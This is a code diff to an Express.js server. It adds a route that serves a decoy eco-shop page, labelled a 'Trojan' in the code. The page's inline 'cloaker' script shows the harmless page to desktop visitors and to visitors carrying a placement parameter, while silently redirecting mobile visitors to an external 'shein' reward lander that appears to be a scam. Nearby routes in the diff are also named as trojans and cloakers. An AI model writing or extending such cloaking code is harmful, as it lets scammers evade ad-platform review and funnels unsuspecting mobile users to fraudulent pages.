@@ -1432,6 +1432,107 @@ app.get('/876/:slug', (req, res, next) => {
             console.log(`Served 876 Trojan (${slug})`);
 });
 
+// SHEIN BH FLUENT
+app.get('/ary/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=ARY`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+            <style>
+    body {
+        font-family: 'Roboto', sans-serif;
+        background-color: #e8f5e9;
+        color: #263238;
+        margin: 0;
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+    }
+    header {
+        background-color: #2e7d32;
+        padding: 1.8em;
+        text-align: left;
+    }
+    h1 {
+        font-size: 2.8em;
+        margin: 0;
+        color: #fff;
+        letter-spacing: 2px;
+    }
+    .content {
+        flex: 1;
+        padding: 3em;
+        max-width: 1000px;
+        margin: 0 auto;
+    }
+    .shop-info {
+        background-color: #c8e6c9;
+        border: 2px solid #2e7d32;
+        padding: 1.5em;
+        margin-bottom: 2.5em;
+        border-radius: 15px;
+    }
+    footer {
+        background-color: #1b5e20;
+        color: #fff;
+        padding: 1.2em;
+        text-align: center;
+    }
+    footer a {
+        color: #81c784;
+        text-decoration: none;
+    }
+    footer a:hover {
+        text-decoration: underline;
+    }
+</style>
+</head>
+<body>
+    <header>
+        <h1>${slug} Grove</h1>
+    </header>
+    
+    <div class="content">
+        <div class="shop-info">
+            <p>Nurturing the essence of: <strong>${slug}</strong></p>
+        </div>
+        
+        <h2>Cultivate Your Inner Wilderness</h2>
+        <p>Welcome to a sanctuary where nature's wisdom and modern living intertwine. Our carefully tended collection awaits your discovery.</p>
+        
+        <h3>Embrace the ${slug} Spirit</h3>
+        <ul>
+            <li>Eco-friendly innovations</li>
+            <li>Handcrafted botanical wonders</li>
+            <li>Sustainable lifestyle essentials</li>
+        </ul>
+    </div>
+    <footer>
+        <p>Grow with ${slug} &copy; 2024 ${slug} Grove | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+    </footer>
+</body>
+</html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served ARY Trojan (${slug})`);
+});
+
 // DUDDV3 CLOAKER
 app.get('/duddv3/:slug', (req, res, next) => {
     const { offer, slug } = req.params;
